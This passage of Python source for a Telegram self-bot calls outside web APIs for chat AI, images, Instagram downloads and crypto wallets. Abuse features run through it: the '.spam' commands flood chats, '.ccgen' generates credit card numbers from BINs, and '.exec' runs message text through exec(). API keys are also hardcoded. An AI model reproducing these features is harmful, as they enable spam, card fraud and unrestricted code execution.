    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **wallet** :  `{wal}` \n\n **private_key** : `{pkk}` \n ▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
   #------------------------ New Ton
 elif text.startswith(".newTon"):
    url = f'https://api.picassocode.ir/Ton.php?key={apiKeyBot}&type=newaccount'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    pk=gpt["result"]["pk"]
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **pk wallet** :  `{pk}` \n ▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#---------------
 elif text == ".carrdme" or text=="کارت":
    msg=f'`{cardnumber}` \n **به نام : {cardname}**'
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#---------------------------name random
 elif text == ".rname" or text=="اسم رندوم":
    url = f'https://api.codebazan.ir/name/?type=json'
    response = requests.get(url)
    html_output = response.text
    msg=f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n __Your Random Name__ = **{html_output}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 elif text == "فال" or text == ".fal":
  try:
    response = requests.get(f"http://mizban-self.ir/self/py-web/fal/fal.php")
    with open('screenshot.png', 'wb') as image_file:image_file.write(response.content)
    app.send_photo(m.chat.id, open('screenshot.png', 'rb'), reply_to_message_id=m.id)
    os.remove("screenshot.png")
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
    
 elif text == ".estekhare" or text == "استخاره":
  try:
    url = requests.get(f"http://mizban-self.ir/self/py-web/estekhare/stekhare.php").json()
    image_url = url["Results"]['link']
    app.send_photo(m.chat.id, image_url , reply_to_message_id=m.id)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 elif text.startswith(".ai"):
    text = text.replace(".ai ", "")
    mm = m.reply("🔆 Wait Please")
    response = requests.get(f"http://mizban-self.ir/self/py-web/ai/index.php?text={text}")
    mm.edit("Downloaded And Uploading!")
    try:
        if response.status_code == 200:
            url = response.json()
            file_paths = ["photos/image.jpg"]
            album = []
            for i, urls in enumerate(url["images"]):
                image_url = GET(urls["url"])
                with open(file_paths[i], "wb") as file:
                    file.write(image_url.content)
                img = Image.open(file_paths[i])
                resized_img = img.resize((853, 1280))  # تغییر اندازه تصویر به ابعاد مجاز تلگرام
                resized_img.save(file_paths[i])
                album.append(InputMediaPhoto(file_paths[i]))
            app.send_media_group(m.chat.id, album, reply_to_message_id=m.id)
        else:
            raise Exception("Response status code is not 200")
    except Exception as e:
        app.send_message(m.chat.id, f"Error: {e}", reply_to_message_id=m.id)

    mm.delete()
#----------------000000000000000000000000000000000000000000------------ 
#0000000000000000000000000000000000000000000000000000000000000000
 elif text.startswith(".pgpt"):
    text = text.replace(".pgpt ", "")
    mm = m.reply("Wait Please")
    response = requests.get(f"http://mizban-self.ir/self/py-web/lexica/index.php?text={text}")
    mm.edit("**Downloaded**")
    try:
        url_list = response.json()
        file_paths = []
        mm1 = m.reply("**Uploading..**")
        for i, image_url in enumerate(url_list[:10]):  # بازگرداندن حداکثر 5 تصویر
            response = requests.get(image_url)
            response.raise_for_status()
            
            # تعیین نام فایل موقت
            file_path = f"photos/image_{i}.jpg"
            
            with open(file_path, "wb") as file:
                file.write(response.content)
            
            img = Image.open(file_path)
            resized_img = img.resize((853, 1280))
            resized_img.save(file_path)
            file_paths.append(file_path)
        album = [InputMediaPhoto(file_path) for file_path in file_paths]
        app.send_media_group(m.chat.id, album, reply_to_message_id=m.id)

    except Exception as e:
        app.send_message(m.chat.id, f"Error: {e}", reply_to_message_id=m.id)
    mm.delete()
    mm1.delete()
#-------------------------arz2-------------------------------
 if text.startswith("نرخ ارز"):
    url = "http://mohammadali.kavir-host-sub.ir/api/arz.php"
    response = requests.get(url)
    html_output = response.text
    price=json.loads(html_output)
    dollar=price["Dollar"]
    euro=price["Euro"]
    pound=price["Pound"]
    derham=price["Derham"]
    lira=price["Lira"]
    franc=price["Franc"]
    ruble=price["Ruble"]
    riyal=price["Riyal"]
    dinar=price["Dinar"]
    afghani=price["Afghani"]
    yuan=price["Yuan"]
    msg=f"قيمت ارز ها عبارت است از : \n دلار : {dollar} \n يورو : {euro} \n درهم : {derham} \n لير ترکيه : {lira} \n فرانک سوييس : {franc} \n روبل روسيه : {ruble} \n ريال عربستان : {riyal} \n دينار عراق : {dinar} \n افغاني : {afghani} \n يوان چين : {yuan} \n تمامي قيمت ها به ريال ميباشد"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)

#--------------------------gpt------------------------
 elif text.startswith(". "):
    text=text.replace('. ','')
    text2=text.replace('. ','')
    if len(text) < 1600 :text=text.replace(' ','+')
    url = f'http://mizban-self.ir/self/py-web/gpt/index.php?text={text}&key=1382'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    message=gpt["message"]
    url2 = f"https://haji-api.ir/text-to-voice?text={message}&Character=DilaraNeural"
    response = requests.get(url2)
    html_output = response.text
    mm1 = json.loads(html_output)
    audio = mm1["results"]["url"]
    app.send_audio(m.chat.id, audio,caption=f"▬▬▬▬▬▬▬▬▬▬▬\n**Your QUERY** =\n [ {text2} ] \n\n **Gpt ANSWER** =\n`{message}` \n▬▬▬▬▬▬▬▬▬▬▬\n**WenosSelf**" ,file_name = "gpt.mp3",performer = "WenosSelf" , reply_to_message_id=m.id)
    
 elif text.startswith("/ "):
    text=text.replace('/ ','')
    text2=text.replace('/ ','')
    if len(text) < 1600 :text=text.replace(' ','+')
    url = f'http://mizban-self.ir/self/py-web/gpt/index.php?text={text}&key=1382'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    message=gpt["message"]
    url2 = f"https://haji-api.ir/text-to-voice?text={message}&Character=FaridNeural"
    response = requests.get(url2)
    html_output = response.text
    mm1 = json.loads(html_output)
    audio = mm1["results"]["url"]
    app.send_audio(m.chat.id, audio,caption=f"▬▬▬▬▬▬▬▬▬▬▬\n**Your QUERY** =\n [ {text2} ] \n\n **Gpt ANSWER** =\n`{message}` \n▬▬▬▬▬▬▬▬▬▬▬\n**WenosSelf**" ,file_name = "gpt.mp3",performer = "WenosSelf" , reply_to_message_id=m.id)

 elif text.startswith(".gpt3 "):
    text=text.replace('.gpt3 ','')
    if len(text) < 1600 :text=text.replace(' ','+')
    url = f'https://mizban-self.ir/GPT.php?text={text}'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    message=gpt["result"]["GPT"]
    msg=f"**{message}**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
    

 elif text.startswith(".ultra "):
    text=text.replace('.ultra ','')
    if len(text) < 1600 :text=text.replace(' ','+')
    url = f'    http://api.brainshop.ai/get?bid=178492&key=CgSM2npGYbaO5gek&uid=[uid]&msg={text}'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    message=gpt["cnt"]
    msg=f"**{message}**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
    
 elif text.startswith(".bard "):
    text = text.replace(".bard ", "")
    url = requests.get(f"https://api.safone.dev/bard?message={text}").json()
    image_url = url["choices"][0]['content'][0]
    msg=f"**{image_url}**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
    
 elif text.startswith(".screenshot "):
    text = text.replace(".screenshot ", "")
    url = requests.get(f"http://mizban-self.ir/self/py-web/shot/Sh.php?url=https://{text}").json()
    image_url = url["Link ScreenShot"]
    app.send_photo(m.chat.id, image_url,caption=f"`{text}`", reply_to_message_id=m.id)
    
 elif text.startswith(".screenshot2 "):
    text = text.replace(".screenshot2 ", "")
    url = requests.get(f"http://mizban-self.ir/self/py-web/shot/Sh.php?url={text}").json()
    image_url = url["Link ScreenShot"]
    app.send_photo(m.chat.id, image_url,caption=f"`{text}`", reply_to_message_id=m.id)
    
 elif text.startswith(".asq "):
    text = text.replace(".asq ", "")
    url = requests.get(f"https://api.safone.dev/asq?query={text}").json()
    image_url = url["answer"]
    msg=f"**{image_url}**"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
    
 elif text.startswith(".anim "):
    text = text.replace(".anim ", "")
    url = requests.get(f"https://api.safone.dev/anime/search?query={text}").json()
    image_url = url["title"]['english']
    image_url2 = url["title"]['native']
    image_url3 = url["title"]['romaji']
    image_url4 = url["genres"]
    image_url5 = url["description"]
    image_url6 = url["duration"]
    image_url7 = url["format"]
    image_url8 = url["status"]
    image_url9 = url['imageUrl']
    image_url10 = url["studios"]
    image_url11 = url["type"]
    image_url13 = url["averageScore"]
    image_url14 = url["endDate"]['day']
    image_url15 = url["endDate"]['month']
    image_url16 = url["endDate"]['year']
    image_url17 = url["episodes"]
    image_url18 = url["season"]
    
    
    app.send_photo(m.chat.id , image_url9 , caption=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Name** = {image_url} / {image_url2} / **{image_url3}**\n**Generes** = `{image_url4}`\n**Duration** = `{image_url6}` Mins\n**Format** = `{image_url7}`\n**Status** = `{image_url8}`\n**studios** = `{image_url10}`\n**Type** = `{image_url11}`\n**average Score** = **{image_url13}**\n**endDate** = **{image_url14}/{image_url15}/{image_url16}**\n**episodes** = `{image_url17}`\n**season** = `{image_url18}` \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬", reply_to_message_id=m.id)
    app.send_message(m.chat.id ,f"**Description** = `{image_url5}`", reply_to_message_id=m.id)

 elif text.startswith(".photo "):
    text = text.replace(".photo ", "")
    if len(text) < 1600 :text=text.replace(' ','+')
    url = requests.get(f"https://api.safone.dev/image?query={text}&limit=3").json()
    image_url = url["results"][0]['imageUrl']
    app.send_photo(m.chat.id , image_url , caption=f"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nHere You are ... WenosSelf\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬", reply_to_message_id=m.id)
    
 elif text.startswith(".photos "):
    text = text.replace(".photos ", "")
    if len(text) < 1600 :text=text.replace(' ','+')
    url = requests.get(f"https://api.safone.dev/image?query={text}&limit=7").json()
    image_url = url["results"][0]['imageUrl']
    image_url2 = url["results"][1]['imageUrl']
    image_url3 = url["results"][2]['imageUrl']
    image_url4 = url["results"][3]['imageUrl']
    image_url5 = url["results"][4]['imageUrl']
    app.send_photo(m.chat.id , image_url ,reply_to_message_id=m.id)
    app.send_photo(m.chat.id , image_url2 ,reply_to_message_id=m.id)
    app.send_photo(m.chat.id , image_url3 ,reply_to_message_id=m.id)
    app.send_photo(m.chat.id , image_url4 ,reply_to_message_id=m.id)
    app.send_photo(m.chat.id , image_url5 ,reply_to_message_id=m.id)
    
 elif text.startswith(".google"):
    resu =""
    text = text.replace(".google ", "")
    req = GET(f"https://api.safone.dev/google?query={text}&limit=5").json()
    for item in req['results']:
     resu += f"#GOOGLE\n❖: {item['title']}\n❖:{item['description']}\n❖ Link : <a href='{item['link']}'>Click on...</a>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
     app.edit_message_text(m.chat.id , m.id , resu)

 elif text.startswith(".news"):
    resu =""
    text = text.replace(".news ", "")
    req = GET(f"https://api.safone.dev/news?category={text}&limit=5").json()
    for item in req['results']:
     resu += f"#News\n❖ Title: **{item['title']}**\n❖**Description**:{item['description']}\n❖**Date** = {item['date']}\n❖ **Link** : <a href='{item['link']}'>Click on...</a>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
     app.edit_message_text(m.chat.id , m.id , resu)
     
 elif text.startswith(".ccgen"):
    text = text.replace(".ccgen ", "")
    url = requests.get(f"https://api.safone.dev/ccgen?bins={text}").json()
    image_url = url["results"][0]['cards']
    msg=f"`{image_url}`"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)

#------------------------------meli---------------------------    
 elif text.startswith(".meli "):
    text=text.replace('.meli ','')
    url = f'https://api.codebazan.ir/codemelli/?code={text}'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    msg = f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **{gpt}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nدرصورت valid بودن , کد ملی وارد شده صحیح میباشد."
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
 #------------- meli
 elif text.startswith("کدملی "):
    text=text.replace('کدملی ','')
    url = f'https://dev.thejban.com/v1/main.php?text={text}&license=@younes_poorghazi'
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    stu=gpt["result"]["message"]["valid"]
    city=gpt["result"]["message"]["city"]
    msg = f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n **وضعیت کد ملی : {stu} \n شهر کد ملی : {city}** \n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nوضعیت کد ملی شما 👆"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
 #------------------------insta
 elif text.startswith(".postt "):
    text=text.replace('.postt ','')
    url = f"https://dev.thejban.com/v1/Instagram/api1.php?url={text}"
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    vi=gpt["url"]
    cp=gpt["title"]
    msg = f"{cp}"
    app.send_video(m.chat.id , vi , caption=f"{cp}")
#--------------------------------------------------
 elif text.startswith(".pp "):
    text=text.replace('.pp ','')
    url = f"https://dev.thejban.com/v1/Instagram/api.php?type=info&url={text}"
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    vi=gpt["pic"]
    bio=gpt["bio"]
    name=gpt["name"]
    npost=gpt["number-post"]
    follower=gpt["follower"]
    following=gpt["following"]
    msg = f"{bio}"
    app.send_photo(m.chat.id , vi , caption=f"**👇 | اطلاعات پیج موردنظر •\n\n👤 نام پیج : {name}\n💎 بیوگرافی پیج : {bio}\n🔢 تعداد پست : {npost}\n👥 Follower : {follower}\n👥 Following : {following}**")
#---------------------------------------------------------
 elif text.startswith(".storyy "):
    text=text.replace('.storyy ','')
    url = f"https://dev.thejban.com/v1/Instagram/api.php?type=story&url={text}"
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    vi=gpt["result-video"]
    app.send_video(m.chat.id , vi , caption=f"**👆 | محتویات مورد نظر با موفقیت ارسال شد •**")
#------------------------------------------------------
 elif text.startswith(".trc20 "):
    text=text.replace('.trc20 ','')
    url = f"https://almoon.ir/trc/File/api.php?url={text}"
    response = requests.get(url)
    html_output = response.text
    gpt=json.loads(html_output)
    stu=gpt["result"]["contractRet"]
    am=gpt["result"]["amount"]
    d=gpt["result"]["date"]
    ti=gpt["result"]["time"]
    wm=gpt["result"]["from"]
    too=gpt["result"]["to"]
    sh=gpt["reault"]["info"]["tokentype"]
    name=gpt["reault"]["info"]["name"]
    nam=gpt["reault"]["info"]["symbol"]
    decimals=gpt["reault"]["info"]["decimals"]
    msg = f"**✅ وضعیت تراکنش : {stu}**\n\n🔍 هش تراکنش : `{text}`\n\n**💰 مقدار تراکنش : {am}**\n\n**🌐 شبکه : {sh}**\n\n**🛜 نام توکن : {name}**\n\n**〽️ نماد توکن : {nam}**\n\n**🌀 دسیمال : {decimals}**\n\n**📅 تاریخ تراکنش : {d}**\n \n**⏰ ساعت تراکنش : {ti}** \n \n📤 ولت مبدا : `{wm}` \n\n 📥 ولت مقصد : `{too}`"
    app.send_message(m.chat.id ,msg, reply_to_message_id=m.id)
#-----------------------------takhfif-----------------
 elif text.startswith(".takhfif"):
  try:
   req1 = GET(f"https://one-api.ir/mopon/?token=257767:6565c68b902f2&action=all&page=1").json()

   for item in req1['result']:
    result1 += f"❖ Name : {item['title']} * valid : {item['valid']} * code: {item[id]}\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
    app.send_message_text(m.chat.id , m.id , result1)
  except Exception as er:
    app.send_message(m.chat.id ,f"خطايي رخ داد لطفا دوباره تلاش کنيد \n {er}", reply_to_message_id=m.id)
    
 #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 elif text.startswith(".giff"):
  try:
    text=text.replace('.giff ','')
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("gif", text)
    if result.results:
        animation_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, animation_result.id)
        image1 = app.get_messages("me", gett.updates[0].id)
        if image1.animation:
            file_path = app.download_media(image1.animation)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_animation(file_path)
            os.remove(file_path)
        else:
            wait.edit("No animation found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No animation found.")
    wait.delete()
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
 elif text.startswith(".melo"):
  try:
    text=text.replace('.melo ','')
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("melobot", text)
    if result.results:
        voice_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, voice_result.id)
        image1 = app.get_messages("me", gett.updates[0].id)
        if image1.voice:
            file_path = app.download_media(image1.voice)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_voice(file_path)
            os.remove(file_path)
        else:
            wait.edit("No voice found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No voice found.")
    wait.delete()
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
#------------------------------------------  
 elif text.startswith(".pic"):
  try:
    text=text.replace('.pic ','')
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("pic", text)
    if result.results:
        photo_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, photo_result.id)
        image1 = app.get_messages("me", gett.updates[0].id)
        if image1.photo:
            file_path = app.download_media(image1.photo)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_photo(file_path, caption=f"**{text}**")
            os.remove(file_path)
        else:
            wait.edit("No Photo found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No photo found.")
    wait.delete()
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)") 
#-------------------------------------
 elif text.startswith(".stick"):
  try:
    text=text.replace('.stick ','')
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("sticker", text)
    if result.results:
        sticker_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, sticker_result.id)
        image1 = app.get_messages("me", gett.updates[0].id)
        if image1.sticker:
            file_path = app.download_media(image1.sticker)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_sticker(file_path)
            os.remove(file_path)
        else:
            wait.edit("No sticker found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No sticker found.")
    wait.delete()
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
#__________________________________________________________
#--------------------------------------
 elif text.startswith(".bing"):
  try:
    text=text.replace('.bing ','')
    wait = m.reply("Wait Please..")
    result = app.get_inline_bot_results("bing", text)
    if result.results:
        photo_result = result.results[0]
        gett = app.send_inline_bot_result("me", result.query_id, photo_result.id)
        image1 = app.get_messages("me", gett.updates[0].id)
        if image1.photo:
            file_path = app.download_media(image1.photo)
            wait.edit("**Downloaded**")
            app.delete_messages("me", gett.updates[0].id)
            m.reply_photo(file_path, caption=f"**{text}**")
            os.remove(file_path)
        else:
            wait.edit("No Photo found.")
            app.delete_messages("me", gett.updates[0].id)
    else:
        wait.edit("No photo found.")
    wait.delete()
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
   
 elif text.startswith(".meme"):
  try:
    text=text.replace('.meme ','')
    m.edit_text(f"command = .meme {text}\n**meme name:** `{text}`")
    result = app.get_inline_bot_results("persian_meme_bot", text)
    app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
 elif text.startswith(".like"):
  try:
    text=text.replace('.like ','')
    result = app.get_inline_bot_results("like", text)
    app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
 elif text.startswith(".location"):
  try:
    text=text.replace('.location ','')
    result = app.get_inline_bot_results("openmap_bot", text)
    app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
 elif text.startswith(".stat"):
  try:
    text=text.replace('.stat ','')
    result = app.get_inline_bot_results("tgstat_bot", text)
    app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   
   
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 elif text.startswith(".qrcode"):
  try:
    qr_str = (m.reply_to_message.text if m.reply_to_message else text.replace('.qrcode' , '')[1::])
    if qr_str == None:
     m.edit_text(f"**ERROR!**\n\n__Please Reply To A Text Message__")
    else:
     qr = qrcode.make(qr_str)
     qr.save("QrCode.png")
     app.send_photo(m.chat.id , f"QrCode.png" , caption=f"QrCode ⤳(`{qr_str}`)" , reply_to_message_id=m.id)
     os.remove(f"QrCode.png")
  except Exception as er:
   m.edit_text(f"**ERROR!** \n\n{er}")
#________________________Spam_______________________________
 elif text.startswith(".spam"):
  try:
   if x := (findall(".spam \d+",text)[0]):
     ui = findall("\d+",x)[0]
     sts = findall("\d+\s+.+",text)[0].replace(ui,"")
   for i in range(0,int(ui)):
    app.send_message(m.chat.id , sts)
  except Exception as er:
   m.edit_text(er)
 elif text.startswith("اسپم"):
  try:
   if x := (findall("اسپم \d+",text)[0]):
     ui = findall("\d+",x)[0]
     sts = findall("\d+\s+.+",text)[0].replace(ui,"")
   for i in range(0,int(ui)):
    app.send_message(m.chat.id , sts)
  except Exception as er:
   m.edit_text(er)
   
 elif text.startswith(".spm"):
  try:
   if x := (findall(".spm \d+",text)[0]):
     ui = findall("\d+",x)[0]
     sts = findall("\d+\s+.+",text)[0].replace(ui,"")
   for i in range(0,int(ui)):
    if m.reply_to_message:
     app.send_message(m.chat.id , sts, reply_to_message_id=m.id)
    else:
     m.edit_text("**Please Reply**")
  except Exception as er:
   m.edit_text(er)
 elif text.startswith("ادیت اسپم"):
  try:
   if x := (findall("ادیت اسپم \d+",text)[0]):
     ui = findall("\d+",x)[0]
     sts = findall("\d+\s+.+",text)[0].replace(ui,"")
   for i in range(0,int(ui)):
    if m.reply_to_message:
     app.send_message(m.chat.id , sts, reply_to_message_id=m.id)
    else:
     m.edit_text("**Please Reply**")
  except Exception as er:
   m.edit_text(er)
#________________________End________________________________
#________________________Code_Runner________________________________
 elif text.startswith(".py"):
  try:
   code = (m.reply_to_message.text if m.reply_to_message else text.replace('.py' , '')[1::])
   app.edit_message_text(m.chat.id ,m.id ,f"__Wait__\n\n**Code** :\n`{code}`")
   rund_c = run_codi(lang="python3" , code=code)
   app.send_message(m.chat.id , rund_c , reply_to_message_id=m.id )
  except Exception as er:
   m.edit_text(er)

 elif text.startswith(".kotlin"):
  try:
   code = (m.reply_to_message.text if m.reply_to_message else text.replace('.kotlin' , '')[1::])
   app.edit_message_text(m.chat.id ,m.id ,f"__Wait__\n\n**Code** :\n`{code}`")
   rund_c = run_codi(lang="kotlin" , code=code)
   app.send_message(m.chat.id , rund_c , reply_to_message_id=m.id )
  except Exception as er:
   m.edit_text(er)

 elif text.startswith(".js"):
  try:
   code = (m.reply_to_message.text if m.reply_to_message else text.replace('.js' , '')[1::])
   app.edit_message_text(m.chat.id ,m.id ,f"__Wait__\n\n**Code** :\n`{code}`")
   rund_c = run_codi(lang="javascript" , code=code)
   app.send_message(m.chat.id , rund_c , reply_to_message_id=m.id )
  except Exception as er:
   m.edit_text(er)

 elif text.startswith(".php"):
  try:
   code = (m.reply_to_message.text if m.reply_to_message else text.replace('.php' , '')[1::])
   app.edit_message_text(m.chat.id ,m.id ,f"__Wait__\n\n**Code** :\n`{code}`")
   rund_c = run_codi(lang="php" , code=code)
   app.send_message(m.chat.id , rund_c , reply_to_message_id=m.id )
  except Exception as er:
   m.edit_text(er)

 elif text.startswith(".lua"):
  try:
   code = (m.reply_to_message.text if m.reply_to_message else text.replace('.lua' , '')[1::])
   app.edit_message_text(m.chat.id ,m.id ,f"__Wait__\n\n**Code** :\n`{code}`")
   rund_c = run_codi(lang="lua" , code=code)
   app.send_message(m.chat.id , rund_c , reply_to_message_id=m.id )
  except Exception as er:
   m.edit_text(er)

 elif text.startswith(".go"):
  try:
   code = (m.reply_to_message.text if m.reply_to_message else text.replace('.go' , '')[1::])
   app.edit_message_text(m.chat.id ,m.id ,f"__Wait__\n\n**Code** :\n`{code}`")
   rund_c = run_codi(lang="go" , code=code)
   app.send_message(m.chat.id , rund_c , reply_to_message_id=m.id )
  except Exception as er:
   m.edit_text(er)

 elif text.startswith(".java"):
  try:
   code = (m.reply_to_message.text if m.reply_to_message else text.replace('.java' , '')[1::])
   app.edit_message_text(m.chat.id ,m.id ,f"__Wait__\n\n**Code** :\n`{code}`")
   rund_c = run_codi(lang="java" , code=code)
   app.send_message(m.chat.id , rund_c , reply_to_message_id=m.id )
  except Exception as er:
   m.edit_text(er)
#________________________End________________________________
#________________________Code ss________________________________
 elif m.text ==".yjc":
    try:
        resu =""
        req = GET(f"http://mizban-self.ir/self/py-web/yjc/yjc.php").json()
        for item in req['results']:
            resu += f"#YJC_News\n❖ Title: **{item['Title']}**\n❖ **Link** : <a href='{item['Link']}'>Click on...</a>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            app.edit_message_text(m.chat.id , m.id , resu)
    except Exception as er:
        m.edit_text(er)
        
 elif m.text == ".carbon":
  try:
    code = (m.reply_to_message.text if m.reply_to_message else text.replace('.carbon' , '')[1::])
    app.edit_message_text(m.chat.id ,m.id ,f"__Making Screenshot from Your Code...__\n\n**Code** :\n`{code}`")
    params = {'code': code,"paddingVertical": "56px","paddingHorizontal": "57px","backgroundImage": None,"backgroundImageSelection": None,"backgroundMode": "color","backgroundColor": "rgba(0, 255, 160, 1)","dropShadow": True,"dropShadowOffsetY": "9px","dropShadowBlurRadius": "12px","theme": "Dracula","language": "auto","fontFamily": "Hack","fontSize": "18px","lineHeight": "250%","windowControls": True,"widthAdjustment": True,"lineNumbers": True,"firstLineNumber": 1,"exportSize": "2x","watermark": False,"squaredImage": False,"hiddenCharacters": True,"width": 680}
    snippet(params)
    app.send_photo(m.chat.id , f"i.png" , caption=f":)" , reply_to_message_id=m.id)
    os.remove(f"i.png")
  except Exception as er:
   m.edit_text(er)
#________________________End________________________________
#________________________Code execute________________________________
 elif text.startswith(".exec"):
  try:
   m.edit_text(f"""**INPUT**\n`{text}`\n\n**OUTPUT**\nWait ...""")
   codeOut = StringIO()
   sys.stdout = codeOut
   exec(str(text.replace(".exec ","")))
   sys.stdout = sys.__stdout__
   results = codeOut.getvalue().strip()
   bic = True if results.strip() != '' else False
   if len(results) >= 3800:
     write("results.txt",str(results))
     m.edit_text(f"""**INPUT**\n`{text}`\n\n**OUTPUT**\n In File👇👹""")
     m.reply_document("results.txt")
     os.remove("results.txt")
   else:
     m.edit_text(f"""**INPUT**\n`{text}`\n\n**OUTPUT**\n`{results if bic == True else 'Successful'}`""")
   codeOut.close()
  except Exception as er:
   app.send_message(m.chat.id , f"❖ **ERROR** :\n(`{er}`)")
#________________________End________________________________
#________________________OCR________________________________
 elif text == ".ocr":
  try:
    if m.reply_to_message.photo:
      m.edit_text("Wait For **8** Second . . .")
      app.send_photo("@oneGooglebot",m.reply_to_message.photo.file_id,caption="")
      sleep(8)
      a = app.get_chat_history("@oneGooglebot", limit=1)
      a = next(a)
      text = a.text;text = text.replace("💭 OCR detected:","")
      m.edit_text("**OCR** __Detected Successfully :)__")
      m.reply(f"**❖ OCR Result:**`{text}`",quote=True)
    else:
      m.edit_text("**Please Reply to a Photo**")
  except Exception as er:
   app.send_message(m.chat.id , f"❖ **ERROR** :\n(`{er}`)")
#________________________End________________________________
#________________________Delete Message________________________________
 elif text.startswith(".delete"):
   mmd = app.get_chat_member(m.chat.id, "me")
   rasi = dast_del(text=mmd)
   if rasi:
     try:
       reu = int(text.replace(".delete",""))
       if type(reu) == int:
         kalc = 0
         for m in app.get_chat_history(m.chat.id):
            if reu != kalc:
              m.delete(revoke=True)
              kalc += 1
            else:
              break
         m.reply(f"❖ `{kalc}` **Messages Successfully Deleted !**", quote=False)
       else:
         m.reply("❖ Please Enter a Number")
     except Exception as er:
       app.send_message(m.chat.id , f"❖ **ERROR** :\n(`{er}`)")
   else:
     m.reply("❖ You Dont Have Delete message Permission")
#________________________End________________________________
#______________________________Get info________________________________
 elif text.startswith(".file_info"):
  getcontext().prec = 3
  try:
   if m.reply_to_message.document: #فایل
     m.edit_text(f"""❖ Name ⤳ (`{m.reply_to_message.document.file_name}`)
❖ Type ⤳ (`{m.reply_to_message.document.mime_type}`)
